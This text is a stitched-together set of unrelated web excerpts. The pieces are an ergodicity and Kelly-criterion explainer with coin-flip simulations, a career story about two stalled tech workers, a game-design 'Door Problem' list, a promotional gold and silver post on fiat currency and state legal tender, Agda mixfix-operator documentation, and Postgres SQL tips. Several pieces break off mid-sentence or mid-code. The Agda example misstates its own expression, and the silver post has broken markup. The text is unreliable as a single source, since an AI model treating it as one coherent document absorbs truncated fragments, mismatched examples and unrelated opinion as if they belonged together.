<p>What will happen? For that first flip, you have a 50% chance of a $50 gain, and a 50% chance of a $40 loss. Your expected gain (each outcome weighted by its probability, 0.5*$50 + 0.5*-$40) is $5 or 5% of your wealth. The absolute size of the stake for future flips will depend on past flips, but for every flip you have the same expected gain of 5% of your wealth.</p>
<p>Should you take the bet?</p>
<p>I simulated 10,000 people who each started with $100 and flipped the coin 100 times each. This line in Figure 1 represents the mean wealth of the 10,000 people. It looks good, increasing roughly in accordance with the expected gain, despite some volatility, and finishing at a mean wealth of over $16,000.</p>
<p><em>Figure 1: Average wealth of population</em><br>
<img src="https://jasonallancollins.files.wordpress.com/2020/01/non_ergodic_figure_1.jpeg?w=1100" alt="Figure 1"></p>
<p>Yet people regularly decline gambles of this nature. Are they making a mistake?</p>
<p>One explanation for declining this gamble is risk aversion. A risk averse person will value the expected outcome of a gamble lower than the same sum with certainty.</p>
<p>Risk aversion can be represented through the concept of utility, where each level of wealth gives subjective value (utility) for the gambler. If people maximise utility instead of the value of a gamble, it is possible that a person would reject the bet.</p>
<p>For example, one common utility function to represent a risk averse individual is to take the logarithm of each level of wealth. If we apply the log utility function to the gamble above, the gambler will reject the offer of the coin flip. [The maths here is simply that the expected utility of the gamble is 0.5*<em>ln</em>(150) + 0.5*<em>ln</em>(60)=4.55, which is less than the utility of the sure $100, <em>ln</em>(100)=4.61.]</p>
<p><strong>The time average growth rate</strong></p>
<p>For a different perspective, below is the plot for the first 20 of these 10,000 people. Interestingly, only two people do better than break even (represented by the black line at $100). The richest has less than $1,000 at period 100.</p>
<p><em>Figure 2: Path of first 20 people</em><br>
<img src="https://jasonallancollins.files.wordpress.com/2020/01/non_ergodic_figure_2.jpeg?w=1100" alt="Figure 2"></p>
<p>What is happening here? The first plot shows that the average wealth across all 10,000 people is increasing. When we look at the first 20 individuals, their wealth generally declines. Even those that make money make less than the gain in aggregate wealth would suggest.</p>
<p>To show this more starkly, here is a plot of the first 20 people on a log scale, together with the average wealth for the full population. They are all below average in final wealth.</p>
<p><em>Figure 3: Plot of first 20 people against average wealth (log scale)</em><br>
<img src="https://jasonallancollins.files.wordpress.com/2020/01/non_ergodic_figure_3.jpeg?w=1100" alt="Figure 3"></p>
<p>If we examine the full population of 10,000, we see an interesting pattern. The mean wealth is over $16,000, but the median wealth after 100 periods is 51 cents, a loss of over 99% of the initial wealth. 54% of the population ends up with less than $1. 86% finishes with less than the initial wealth of $100. Yet 171 people end up with more than $10,000. The wealthiest person finishes with $117 million, which is over 70% of the total wealth of the population.</p>
<p>For most people, the series of bets is a disaster. It looks good only on average, propped up by the extreme good luck and massive wealth of a few people. The expected payoff does not match the experience of most people.</p>
<p><strong><em>Four possible outcomes</em></strong></p>
<p>One way to think about what is happening is to consider the four possible outcomes over the first two periods.</p>
<p>The first person gets two heads. They finish with $225. The second and third person get a heads and a tails (in different orders), and finish with $90. The fourth person ends up with $36.</p>
<p>The average across the four is $110.25, reflecting the compound 5% growth. That’s our positive picture. But three of the four lost money. As the number of flips increases, the proportion who lose money increases, with a rarer but more extraordinarily rich cohort propping up the average.</p>
<p><strong><em>Almost surely</em></strong></p>
<p>Over the very long-term, an individual will tend to get around half heads and half tails. As the number of flips goes to infinite, the number of heads and tails is “<a href="https://en.wikipedia.org/wiki/Almost_surely">almost surely</a>” equal.</p>
<p>This means that each person will tend to get a 50% increase half the time (or 1.5 times the initial wealth), and a 40% decrease half the time (60% of the initial wealth). A bit of maths and the time average growth in wealth for an individual is (1.5*0.6)<sup>0.5</sup> ~ 0.95, or approximately a 5% decline in wealth each period. Every individual’s wealth will tend to decay at that rate.</p>
<p>To get an intuition for this, a long run of equal numbers of heads and tails is equivalent to flipping a head and a tail every two periods. Suppose that is exactly what you did – flipped a heads and then flipped a tail. Your wealth would increase to $150 in the first round ($100*1.5), and then decline to $90 in the second ($150*0.6). You get the same result if you change the order. Effectively, you are losing 10% (or getting only 1.5*0.6=0.9) of your money every two periods.</p>
<p>A system where the time average converges to the ensemble average (our population mean) is known as an ergodic system. The system of gambles above is non-ergodic as the time average and the ensemble average diverge. And given we cannot individually experience the ensemble average, we should not be misled by it. The focus on ensemble averages, as is typically done in economics, can be misleading if the system is non-ergodic.</p>
<p><strong><em>The longer term</em></strong></p>
<p>How can we reconcile this expectation of loss when looking at the time average growth with the continued growth of the wealth of some people after 100 periods? It does not seem that everyone is “almost surely” on the path to ruin.</p>
<p>But they are. If we plot the simulation for, say, 1,000 periods rather than 100, there are few winners. Here’s a plot of the average wealth of the population for 1000 periods (the first 100 being as previously shown), plus a log plot of that same growth (Figures 4 and 5).</p>
<p><em>Figure 4: Plot of average wealth over 1000 periods</em><br>
<img src="https://jasonallancollins.files.wordpress.com/2020/01/non_ergodic_figure_4.jpeg?w=1100" alt="Figure 4"></p>
<p><em>Figure 5: Plot of average wealth over 1000 periods (log plot)</em><br>
<img src="https://jasonallancollins.files.wordpress.com/2020/01/non_ergodic_figure_5.jpeg?w=1100" alt="Figure 5"></p>
<p>We can see that despite a large peak in wealth around period 400, wealth ultimately plummets. Average wealth at period 1000 is $24, below the starting average of $100, with a median wealth of 1×10<sup>-21</sup> (rounding to the nearest cent, that is zero). The wealthiest person has $242 thousand dollars, with that being 98.5% of the total wealth. If we followed that wealthy person for another 1000 generations, I would expect them to be wiped out too. [I tested that – at 2000 periods the wealthiest person had $4×10<sup>-7</sup>.] Despite the positive expected value, the wealth of the entire population is wiped out.</p>
<p><strong>Losing wealth on a positive value bet</strong></p>
<p>The first 100 periods of bets forces us to hold a counterintuitive idea in our minds. While the population as an aggregate experiences outcomes reflecting the positive expected value of the bet, the typical person does not. The increase in wealth across the aggregate population is only due to the extreme wealth of a few lucky people.</p>
<p>However, the picture over 1000 periods appears even more confusing. The positive expected value of the bet is nowhere to be seen. How could this be the case?</p>
<p>The answer to this lies in the distribution of bets. After 100 periods, one person had 70% of the wealth. We no longer have 10,000 equally weighted independent bets as we did in the first round. Instead, the path of the wealth of the population is largely subject to the outcome of the bets by this wealthy individual. As we have already shown, the wealth path for an individual almost surely leads to a compound 5% loss of wealth. That individual’s wealth is on borrowed time. The only way for someone to maintain their wealth would be to bet a smaller portion of their wealth, or to diversify their wealth across multiple bets.</p>
<p><strong>The Kelly criterion</strong></p>
<p>On the first of these options, the portion of a person’s wealth they should enter as stakes for a positive expected value bet such as this is given by the <a href="https://en.m.wikipedia.org/wiki/Kelly_criterion">Kelly Criterion</a>. The Kelly criterion gives the bet size that would maximise the geometric growth rate in wealth.</p>
<p>The Kelly criterion formula for a simple bet is as follows:</p>
<p><img src="https://s0.wp.com/latex.php?latex=f%3D%5Cfrac%7Bbp-q%7D%7Bb%7D%3D%5Cfrac%7Bp%28b%2B1%29-1%7D%7Bb%7D&amp;bg=ffffff&amp;fg=000000&amp;s=1" alt="f=\frac{bp-q}{b}=\frac{p(b+1)-1}{b}" title="f=\frac{bp-q}{b}=\frac{p(b+1)-1}{b}"></p>
<p>where</p>
<blockquote><p>
  <em>f</em> is the fraction of the current bankroll to wager</p>
<p>  <em>b</em> is the net odds received on the wager (i.e. you receive $b back on top of the $1 wagered for the bet)</p>
<p>  <em>p</em> is the probability of winning</p>
<p>  <em>q</em> is the probability of losing (1-p)
</p></blockquote>
<p>For the bet above, we have <em>p</em>=0.5 and <img src="https://s0.wp.com/latex.php?latex=b%3D%5Cfrac%7B0.5%7D%7B0.4%7D%3D1.25&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="b=\frac{0.5}{0.4}=1.25" title="b=\frac{0.5}{0.4}=1.25">. As offered, we are effectively required to bet <em>f</em>=0.4, or 40% of our wealth, for that chance to win a 50% increase.</p>
<p>However, if we apply the above formula given <em>p</em> and <em>b</em>, a person should bet <img src="https://s0.wp.com/latex.php?latex=%5Cfrac%7B%280.5%2A%281.25%2B1%29-1%29%7D%7B1.25%7D%3D0.1&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\frac{(0.5*(1.25+1)-1)}{1.25}=0.1" title="\frac{(0.5*(1.25+1)-1)}{1.25}=0.1">, or 10%, of their wealth each round to maximise the geometric growth rate.</p>
<p>The Kelly criterion is effectively maximising the expected log utility of the bet through setting the size of the bet. The Kelly criterion will result in someone wanting to take a share of any bet with positive expected value.</p>
<p>The Kelly bet “almost surely”” leads to higher wealth than any other strategy in the long run.</p>
<p>If we simulate the above scenarios, but risking only 10% of wealth each round rather than 40% (i.e. heads wealth will increase by 12.5%, tails it will decrease by 10%), what happens? The expected value of the Kelly bet is 0.5*0.125+0.5*-0.1=0.0125 …</p></div></div>

	<div><div><p dir="ltr">"Well, in our country," said Alice, still panting a little, "you'd generally get to somewhere else—if you run very fast for a long time, as we've been doing."</p><p dir="ltr">"A slow sort of country!" said the Queen. "Now, here, you see, it takes all the running you can do, to keep in the same place. If you want to get somewhere else, you must run at least twice as fast as that!"&nbsp;</p><p dir="ltr">Lewis Carroll. Through The Looking-Glass.</p></div></div>
</div><div>
	
	<div><div><p dir="ltr">Meet Fiona.</p><p dir="ltr">Fiona is a data scientist at company Z. She lacks a traditional background in math and computer science, so the position has been challenging from the beginning. Fortunately, company Z had faith that Fiona could learn on the job. She started doing relatively simple, even routine work of the data-analyst type: running simple SQL queries, compiling simple reports, making exploratory data analyses into PowerPoint presentations and presenting them to her colleagues on a large screen. Sometimes she would train a model or two — but always without any real insight into the model or its performance.&nbsp;</p><p dir="ltr">Years kept flying by, yet Fiona was still at company Z: running simple queries, compiling simple reports, and presenting her exploratory data analyses. This was not due to lack of effort: Fiona is very diligent and hard-working. She has often stayed at work until 7pm. She has followed all the helpful and not-so-helpful recommendations given to her by her manager and her more senior colleagues: use version control. Use a good IDE instead of jupyter notebooks in the browser. Check out free data science talks on the Internet. Use logging statements liberally. Have your teammates review your code. Above all, have faith that you will get better over time.</p><p dir="ltr">It is this faith that she has started to lose. It should interest the reader to know that Company Z is a progressive one. It is distinctly ahead of the pack, when it comes to internal mentorship. In Fiona’s case, it did not seem to make a dent. Every now and then, perhaps every few weeks, one of the senior data scientists would take a look at what she was doing. Then after a 10 or 15-minute chat, the senior colleague would offer a tip or two:</p><p dir="ltr">Here this loop is too clumsy. You may want to use list comprehension with a lambda function.</p><p dir="ltr">The result is not statistically significant, but here it doesn’t matter.</p><p dir="ltr">Use a neural network in this case. It will perform well.</p><p dir="ltr">Fiona just could not grasp this kind of advice because she lacked the foundation. She was good enough with lists, but lambda functions made no sense to her whatsoever. Why would this kind of code even compile?! Statistical significance was another mystery to her: if an A/B test has shown that A is better than B, how could someone claim otherwise while keeping a straight face? Is it some esoteric knowledge learned by the chosen few in graduate school? And do not even get me started on the neural network one. Once Fiona had the courage to ask, why indeed a neural network was better in a particular case. Her difficulty was that she could not even grasp what “better” meant for a machine learning model. Imagine her frustration when the senior colleague went deep into the nuances of convolutional networks and how those, after all, have “some similarity” to boosted trees. He felt good about himself, and Fiona was too embarrassed to admit that she could not understand a thing.</p><p dir="ltr">Some readers would advise her to go over such complex explanations on her own time, at home. That she had tried too, but memorizing all the relevant details proved impossible. Even when she could find a published article explaining a particular concept, it was of no use. No amount of staring at the printed text seemed to help: data science remained as elusive as when she had started the job a few years prior.</p><p dir="ltr">Other readers would suggest online courses — and sure enough, she had tried that too! Last year she took a 10-hour course “Machine Learning in Python” on one website and a 10-hour course “Communicating effectively with your Data Science Manager” on another one. She did a pet project plotting income distributions in her city and even wrote a guest blog post about it for a personal blog of an Australian Director of Data Science. That guy is working at a startup neither of us has ever heard about. Fiona is dutifully subscribed to two IEEE journals and owns a Pomodoro timer, chunking her time into 25-minute working intervals interlaced with 5-minute breaks.</p><p dir="ltr">Nothing.&nbsp;</p><p dir="ltr">She started to feel that there is no hope for her.</p><p dir="ltr">She started to feel that she will never get better.</p><p dir="ltr">She started to feel that her senior colleagues attempting to mentor her were wasting their time.</p><p dir="ltr">She thought of working for another company, but what has she learned over her last five years at Company Z? Here at least she knows how everything operates; she can keep adding a little bit of value, hopefully justifying her modest paycheck. But who else would want to hire her?&nbsp;</p><p dir="ltr">She feels stuck in a hopeless situation and dreads going to work every day. Make no mistake: Company Z has a meaningful mission, and Fiona is treated well. She just feels useless.&nbsp;</p><p dir="ltr">What has happened to Fiona may be all too common, but what if she just doesn’t have what it takes to succeed in the tech industry? In our quest for answers we will travel to the other coast and take a look at a big financial company F.&nbsp;</p><p dir="ltr">Inside of this company we will find Jacob.</p><p dir="ltr">Jacob comes from an upper-middle class family. He holds mildly conservative views, largely due to his upbringing. If he could do it all over again, he would have become a lawyer or a politician. And yet, after going to a good college he somehow ended up with a degree in Computer Science and Engineering.&nbsp;</p><p dir="ltr">Being conservative, Jacob decided to start his career at a big company B. He has worked hard and put in the same number of overtime hours as Fiona —&nbsp;not forgetting to get his regular after-work glass of beer with a few of his coworkers. Being a person who has been handed privileges from birth, he did not need to take a lot of initiative. Company B is not particularly progressive when it comes to internal mentorship either, not even close to Company Z. However, due to his love of sports and beer, senior team members liked hanging out with him. They would explain little bits of tech to Jacob every now and then. Having been through enough college courses — and enough experienced tutors paid for by his parents — he would understand and pick up at least some of the bits he was being shown. His senior colleagues attributed it to his drive or natural potential, and kept helping him improve further.</p><p dir="ltr">A couple years later Jacob moved on to another big company F. While hopping jobs was not in his character, his new employer has a better 401(k) plan, and is involved with trading stocks, which has a lot of potential, — explains Jacob. New responsibilities prompted a new cycle of learning and higher pay. Eventually Jacob got pretty good at C++ and financial analytics, and settled comfortably into his cushy, stable role of a Senior Quantitative Developer.&nbsp;</p><p dir="ltr">This is where his growth came to a halt.&nbsp;</p><p dir="ltr">Five years forward, Jacob is still at Company F, in the same role. He is not really learning on the job any more. Every now and then, perhaps every few weeks, one of the quants will take 15 minutes to explain a particular trading concept to Jacob. Lacking a foundation in finance, he finds it impossible to understand any of the finer points being thrown at him. The quants attribute it to Jacob’s lack of enthusiasm or lack of natural aptitude for finance.</p><p dir="ltr">He keeps using the same language he has been using for the last several years, C++, and calls himself an “expert”. True experts among the readers will disagree: Jacob knows nothing about the internals of the language, such as how templates are actually implemented under the hood. He does not know or care about the differences between various C++ compilers, and ten years from now he will not know either. He has never attempted to create a binding to wrap his favorite C++ subroutines into a python library. Jacob’s knowledge is confined to a rather narrow subset of the language constructs and libraries that he has become comfortable with.&nbsp;</p><p dir="ltr">This was not due to lack of effort: much like Fiona, Jacob is very diligent and hard-working. He has followed all the excellent and not-so-excellent suggestions of the quants, his more senior developer colleagues and his several bosses: attend a conference per year. Read useful blog articles every now and then. Heck, he has even taught C++ to some kids at a local nonprofit sponsored by a local church! The course has lasted for 6 months, and he ended up giving 14 lectures and grading 3 homework assignments submitted by 12 different kids!</p><p dir="ltr">Some readers would advise Jacob to try and get a deeper understanding of finance as he is working for a financial company. That too he did, even completing a 20-hour course online called “Foundations of Banking”. Now every time the Fed changes interest rates, Jacob has a great topic for a morning coffee chat with the quants. He has also purchased 3 ounces of gold to build his financial intuition, as per the recommendation of one of his bosses, but does not have time to keep following the gold prices. Most days he is sufficiently tired after work and wants nothing more than to spend time with his family or to catch up on his favorite TV show. After all, life is about work-life balance, isn’t it?</p><p dir="ltr">Other readers would suggest doing a side project. He did try that too, creating a tool to price stock options. To be sure, the essential code came from a blog that he had googled in the first 30 seconds, but the part downloading the necessary data from a public API and the interactive visualization plots, that was Jacob’s. He has even presented the project at a local meetup.&nbsp;</p><p dir="ltr">None of this seemed to help. Every time he reflected on his career, it looked exactly the same: same company, same tasks, same people, same pay. After running out of other ideas Jacob even bought a Pomodoro timer …</p></div></div></div></div>

        <p><span>“So what does a game designer do? Are you an artist? Do you design characters and write the story? Or no, wait, you’re a programmer?”</span></p>
<p>Game design is one of those nebulous terms to people outside the game industry that’s about as clear as the “astrophysicist” job title is to me. It’s also my job, so I find myself explaining what game design means to a lot of people from different backgrounds, some of whom don’t know anything about games.</p>
<h2>The Door Problem</h2>
<p>I like to describe my job in terms of “The Door Problem”.</p>
<p>Premise: You are making a game.</p>
<ul>
<li>Are there doors in your game?</li>
<li>Can the player open them?</li>
<li>Can the player open every door in the game?</li>
<li>Or are some doors for decoration?</li>
<li>How does the player know the difference?</li>
<li>Are doors you can open green and ones you can’t red? Is there trash piled up in front of doors you can’t use? Did you just remove the doorknobs and call it a day?</li>
<li>Can doors be locked and unlocked?</li>
<li>What tells a player a door is locked and will open, as opposed to a door that they will never open?</li>
<li>Does a player know how to unlock a door? Do they need a key? To hack a console? To solve a puzzle? To wait until a story moment passes?</li>
<li>Are there doors that can open but the player can never enter them?</li>
<li>Where do enemies come from? Do they run in from doors? Do those doors lock afterwards?</li>
<li>How does the player open a door? Do they just walk up to it and it slides open? Does it swing open? Does the player have to press a button to open it?</li>
<li>Do doors lock behind the player?</li>
<li>What happens if there are two players? Does it only lock after both players pass through the door?</li>
<li>What if the level is REALLY BIG and can’t all exist at the same time? If one player stays behind, the floor might disappear from under them. What do you do?</li>
<li>Do you stop one player from progressing any further until both are together in the same room?</li>
<li>Do you teleport the player that stayed behind?</li>
<li>What size is a door?</li>
<li>Does it have to be big enough for a player to get through?</li>
<li>What about co-op players? What if player 1 is standing in the doorway – does that block player 2?</li>
<li>What about allies following you? How many of them need to get through the door without getting stuck?</li>
<li>What about enemies? Do mini-bosses that are larger than a person also need to fit through the door?</li>
</ul>
<p>It’s a pretty classic design problem. SOMEONE has to solve The Door Problem, and that someone is a designer.</p>
<h2>The Other Door Problems</h2>
<p>To help people understand the role breakdowns at a big company, I sometimes go into how other people deal with doors.</p>
<ul>
<li><span>Creative Director</span>: “Yes, we definitely need doors in this game.”</li>
<li><strong>Project Manager</strong>: “I’ll put time on the schedule for people to make doors.”</li>
<li><span>Designer</span>: “I wrote a doc explaining what we need doors to do.”</li>
<li><span>Concept Artist</span>: “I made some gorgeous paintings of doors.”</li>
<li><span>Art Director</span>: “This third painting is exactly the style of doors we need.”</li>
<li><span>Environment Artist</span>: “I took this painting of a door and made it into an object in the game.”</li>
<li><span>Animator</span>: “I made the door open and close.”</li>
<li><strong>Sound Designer</strong>: “I made the sounds the door creates when it opens and closes.”</li>
<li><strong>Audio Engineer</strong>: “The sound of the door opening and closing will change based on where the player is and what direction they are facing.”</li>
<li><strong>Composer</strong>: “I created a theme song for the&nbsp;door.”</li>
<li><span>FX Artist</span>: “I added some cool sparks to the door when it opens.”</li>
<li><strong>Writer</strong>: “When the door opens, the player will say, ‘Hey look! The door opened!’ “</li>
<li><span>Lighter</span>: “There is a bright red light over the door when it’s locked, and a green one when it’s opened.”</li>
<li><span>Legal</span>: “The environment artist put a Starbucks logo on the door. You need to remove that if you don’t want to be sued.”</li>
<li><strong>Character Artist</strong>: “I don’t really care about this door until it can start wearing hats.”</li>
<li><span>Gameplay Programmer</span>: “This door asset now opens and closes based on proximity to the player. It can also be locked and unlocked through script.”</li>
<li><strong>AI Programmer:</strong> “Enemies and allies now know if a door is there and whether they can go through it.”</li>
<li><strong>Network&nbsp;Programmer:</strong> “Do all the players need to see the door open at the same time?”</li>
<li><strong>Release Engineer</strong>: “You need to get your doors in by 3pm if you want them on the disk.”</li>
<li><strong>Core Engine Programmer:&nbsp;</strong>“I have optimized the code to allow up to 1024 doors in the game.”</li>
<li><strong>Tools Programmer:</strong> “I made it even easier for you to place doors.”</li>
<li><span>Level Designer</span>: “I put the door in my level and locked it. After an event, I unlocked it.”</li>
<li><strong>UI Designer</strong>: “There’s now an objective marker on the door, and it has its own icon on the map.”</li>
<li><strong>Combat Designer</strong>: “Enemies will spawn behind doors, and lay cover fire as their allies enter the room. Unless the player is looking inside the door in which case they will spawn behind a different door.”</li>
<li><strong>Systems&nbsp;Designer</strong>: “A&nbsp;level 4 player&nbsp;earns 148xp for opening this door at the cost of 3 gold.”</li>
<li><strong>Monetization Designer</strong>: “We could charge the player $.99 to open the door now, or wait 24 hours for it to open automatically.”</li>
<li><span>QA Tester</span>: “I walked to the door. I ran to the door. I jumped at the door. I stood in the doorway until it closed. I saved and reloaded and walked to the door. I died and reloaded then walked to&nbsp;the door. I threw grenades at the door.”</li>
<li><strong>UX / Usability Researcher</strong>: “I found some people on Craigslist to go through the door so we could see what problems crop&nbsp;up.”</li>
<li><strong>&nbsp;Localization</strong>: “Door. Puerta. Porta. Porte.&nbsp;Tür. Dør. Deur. Drzwi. Drws.&nbsp;문”</li>
<li><strong>Producer</strong>: “Do we need to give everyone those&nbsp;doors or can we save them for a pre-order bonus?”</li>
<li><strong>Publisher</strong>: “Those doors&nbsp;are really going to help this game stand out during the fall line-up.”</li>
<li><strong>CEO:</strong> “I want you all to know how much I appreciate the time and effort put into making those doors.”</li>
<li><strong>PR</strong>: “To all our fans, you’re going to go&nbsp;crazy over our next reveal #gamedev #doors #nextgen #retweet”</li>
<li><strong>Community Manager</strong>: “I let the fans know that their concerns about doors will be addressed in the upcoming&nbsp;patch.”</li>
<li><strong>Customer Support</strong>: “A player contacted us,&nbsp;confused about doors. I gave them detailed instructions on how to use them.”</li>
<li><span>Player</span>: “I totally didn’t even notice a door there.”</li>
</ul>
<p>One of the reasons I like this example is because it’s so mundane. There’s an impression that game design is flashy and cool and about crazy ideas and fun all the time. But when I start off with, “Let me tell you about doors…” it cuts straight to the everyday practical considerations.</p>
<p><em>Recent edits:&nbsp;Added&nbsp;localization, character artist, system designer, combat designer, composer, audio engineer, monetization designer, and I think that’ll be it for now.</em></p>

<p>Our U.S. dollar (USD) purchasing power is plummeting by the day, people!</p>



<p>It seems like only yesterday that we could exchange $15 for an ounce of silver. Now, we need to exchange nearly $30 for an ounce of silver. Evidently, Yogi Berra was not wrong when he quipped, “<em>a nickel ain’t worth a dime anymore</em>.”</p>



<div><figure><img loading="lazy" width="653" height="607" src="https://coventryleague.com/wp-content/uploads/2020/08/silver-price_2020-08-06_intraday.jpg" alt="Silver price per ounce on 06-August-2020.

<p>Will we see $50 per ounce soon? Coventry League has commented about <a href="https://coventryleague.com/blogentary/quarter-billion-dollar-man/" target="_blank" aria-label="gold and fiat currency (opens in a new tab)" rel="noreferrer noopener">gold and fiat currency</a> in the past. The blog ZeroHedge also asked a similar question a week or so ago: “<em>Which comes first: gold $3000 or silver $50 (thanks to @neelkashkari for making this question possible)</em>.”</p>



<blockquote><p lang="en" dir="ltr">Which comes first: gold $3000 or silver $50 (thanks to <a href="https://twitter.com/neelkashkari?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">@neelkashkari</a> for making this question possible). <a href="https://t.co/7QRZ1fPsEU" target="_blank">pic.twitter.com/7QRZ1fPsEU</a></p>— zerohedge (@zerohedge) <a href="https://twitter.com/zerohedge/status/1287788828749635587?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">July 27, 2020</a></blockquote> 



<p>Fortunately, at least half-dozen states have passed legislation recognizing <a href="https://gsiexchange.com/rules-of-gold/" target="_blank" aria-label="gold and silver legal tender (opens in a new tab)" rel="noreferrer noopener">gold and silver legal tender</a>.</p>



<h2>Top 6 States for Gold and Silver Legal Tender</h2>



<figure><table><tbody><tr><td><strong>Rank</strong></td><td><strong>State</strong></td><td><strong>Year (legal)</strong></td></tr><tr><td>1.</td><td><a href="https://gsiexchange.com/rules-of-gold/utah/" target="_blank" aria-label="Utah (opens in a new tab)" rel="noreferrer noopener">Utah</a></td><td>2011</td></tr><tr><td>2.</td><td><a href="https://gsiexchange.com/rules-of-gold/south-carolina/" target="_blank" aria-label="South Carolina (opens in a new tab)" rel="noreferrer noopener">South Carolina</a></td><td>2013</td></tr><tr><td>3.</td><td><a href="https://gsiexchange.com/rules-of-gold/oklahoma/" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Oklahoma</a></td><td>2014</td></tr><tr><td>4.</td><td><a href="https://gsiexchange.com/rules-of-gold/arizona/" target="_blank" aria-label="Arizona (opens in a new tab)" rel="noreferrer noopener">Arizona</a></td><td>2014</td></tr><tr><td>5.</td><td><a href="https://gsiexchange.com/rules-of-gold/wyoming/" target="_blank" aria-label="Wyoming (opens in a new tab)" rel="noreferrer noopener">Wyoming</a></td><td>2018*</td></tr><tr><td>6.</td><td><a href="https://gsiexchange.com/rules-of-gold/west-virginia/" target="_blank" aria-label="West Virginia (opens in a new tab)" rel="noreferrer noopener">West Virginia</a></td><td>2019</td></tr></tbody></table><figcaption>* Wyoming has more legislation to finalize (but almost there)</figcaption></figure>







<p>Utah, South Carolina, and Oklahoma have been the “gold standard” in setting legal precedent for returning to gold and silver legal tender. Congrats, by the way, to the newcomer on the list, “Take Me Home, Country Roads” West Virginia.</p>

<p>A type name, function name, or constructor name can comprise one or more name
parts if we separate them with underscore characters <code><span>_</span></code>, and the
resulting name can be used as an operator. From left to right, each argument
goes in the place of each underscore <code><span>_</span></code>.</p>
<p>For instance, we can join with underscores the name parts <code><span>if</span></code>, <code><span>then</span></code>,
and <code><span>else</span></code> into a single name <code><span>if_then_else_</span></code>. The application of the
function name <code><span>if_then_else_</span></code> to some arguments named <code><span>x</span></code>, <code><span>y</span></code>, and <code><span>z</span></code>
can still be written as:</p>
<ul>
<li>a standard application by using the full name <code><span>if_then_else_</span> <span>x</span> <span>y</span> <span>z</span></code></li>
<li>an operator application by placing the arguments between the name parts
<code><span>if</span> <span>x</span> <span>then</span> <span>y</span> <span>else</span> <span>z</span></code>, leaving a space between arguments and part names</li>
<li>other <em>sections</em> of the full name, for instance leaving one or two underscores:<ul>
<li><code><span>(if_then</span> <span>y</span> <span>else</span> <span>z)</span> <span>x</span></code></li>
<li><code><span>(if</span> <span>x</span> <span>then_else</span> <span>z)</span> <span>y</span></code></li>
<li><code><span>if</span> <span>x</span> <span>then</span> <span>y</span> <span>else_</span> <span>z</span></code></li>
<li><code><span>if</span> <span>x</span> <span>then_else_</span> <span>y</span> <span>z</span></code></li>
<li><code><span>if_then</span> <span>y</span> <span>else_</span> <span>x</span> <span>z</span></code></li>
<li><code><span>(if_then_else</span> <span>z)</span> <span>x</span> <span>y</span></code></li>

<p>Consider the expression <code><span>true</span> <span>and</span> <span>false</span> <span>⇒</span> <span>false</span></code>.
Depending on which of <code><span>_and_</span></code> and <code><span>_⇒_</span></code> has more precedence,
it can either be read as <code><span>(false</span> <span>and</span> <span>true)</span> <span>⇒</span> <span>false</span> <span>=</span> <span>true</span></code>,
or as <code><span>false</span> <span>and</span> <span>(true</span> <span>⇒</span> <span>false)</span> <span>=</span> <span>true</span></code>.</p>
<p>Each operator is associated to a precedence, which is a floating point number
(can be negative and fractional!).
The default precedence for an operator is 20.</p>
<div>
<p>Note</p>
<p>Please note that <code><span>-&gt;</span></code> is directly handled in the parser. As a result, the
precedence of <code><span>-&gt;</span></code> is lower than any precedence you may declare with
<code><span>infixl</span></code> and <code><span>infixr</span></code>.</p>
</div>
<p>If we give <code><span>_and_</span></code> more precedence than <code><span>_⇒_</span></code>, then we will get the first result:</p>

</div>
<p>But, if we declare a new operator <code><span>_and’_</span></code>
and give it less precedence than
<code><span>_⇒_</span></code>, then we will get the second result:</p>

            <p>Do you work with Postgres on a daily basis? Write application code that talks
to Postgres? Then check out the bite-sized SQL snippets below that can help
you work faster!</p>

<h3 id="insert-multiple-rows-in-one-statement">Insert Multiple Rows In One Statement</h3>

<p>The INSERT statement can insert more than one row in a single statement:</p>

<figure><pre><code data-lang="sql"><span>INSERT</span> <span>INTO</span> <span>planets</span> <span>(</span><span>name</span><span>,</span> <span>gravity</span><span>)</span>
     <span>VALUES</span> <span>(</span><span>'earth'</span><span>,</span>    <span>9</span><span>.</span><span>8</span><span>),</span>
            <span>(</span><span>'mars'</span><span>,</span>     <span>3</span><span>.</span><span>7</span><span>),</span>
            <span>(</span><span>'jupiter'</span><span>,</span> <span>23</span><span>.</span><span>1</span><span>);</span></code></pre></figure>

<p>Read more about what INSERT can do <a href="https://pgdash.io/blog/postgres-insert.html">here</a>.</p>

<h3 id="insert-a-row-and-return-automatically-assigned-values">Insert a Row and Return Automatically-assigned Values</h3>

<p>Values auto-generated with DEFAULT/serial/IDENTITY constructs can be returned
by the INSERT statement using the RETURNING clause. From the application
code perspective, such an INSERT is executed like a SELECT that returns a
recordset.</p>

<figure><pre><code data-lang="sql"><span>-- table with 2 column values auto-generated on INSERT</span>
<span>CREATE</span> <span>TABLE</span> <span>items</span> <span>(</span>
    <span>slno</span>       <span>serial</span>      <span>PRIMARY</span> <span>KEY</span><span>,</span>
    <span>name</span>       <span>text</span>        <span>NOT</span> <span>NULL</span><span>,</span>
    <span>created_at</span> <span>timestamptz</span> <span>DEFAULT</span> <span>now</span><span>()</span>
<span>);</span>

<span>INSERT</span> <span>INTO</span> <span>items</span> <span>(</span><span>name</span><span>)</span>
     <span>VALUES</span> <span>(</span><span>'wooden axe'</span><span>),</span>
            <span>(</span><span>'loom'</span><span>),</span>
            <span>(</span><span>'eye of ender'</span><span>)</span>
  <span>RETURNING</span> <span>name</span><span>,</span> <span>slno</span><span>,</span> <span>created_at</span><span>;</span>

<span>-- returns:</span>
<span>--      name     | slno |          created_at</span>
<span>-- --------------+------+-------------------------------</span>
<span>--  wooden axe   |    1 | 2020-08-17 05:35:45.962725+00</span>
<span>--  loom         |    2 | 2020-08-17 05:35:45.962725+00</span>
<span>--  eye of ender |    3 | 2020-08-17 05:35:45.962725+00</span></code></pre></figure>

<h3 id="autogenerated-uuid-primary-keys">Autogenerated UUID Primary Keys</h3>

<p>UUIDs are sometimes used instead of primary keys for various reasons. Here is
how you can use an UUID instead of a serial or IDENTITY:</p>

<figure><pre><code data-lang="sql"><span>CREATE</span> <span>EXTENSION</span> <span>IF</span> <span>NOT</span> <span>EXISTS</span> <span>"uuid-ossp"</span><span>;</span>

<span>CREATE</span> <span>TABLE</span> <span>items</span> <span>(</span>
    <span>id</span>    <span>uuid</span> <span>DEFAULT</span> <span>uuid_generate_v4</span><span>(),</span>
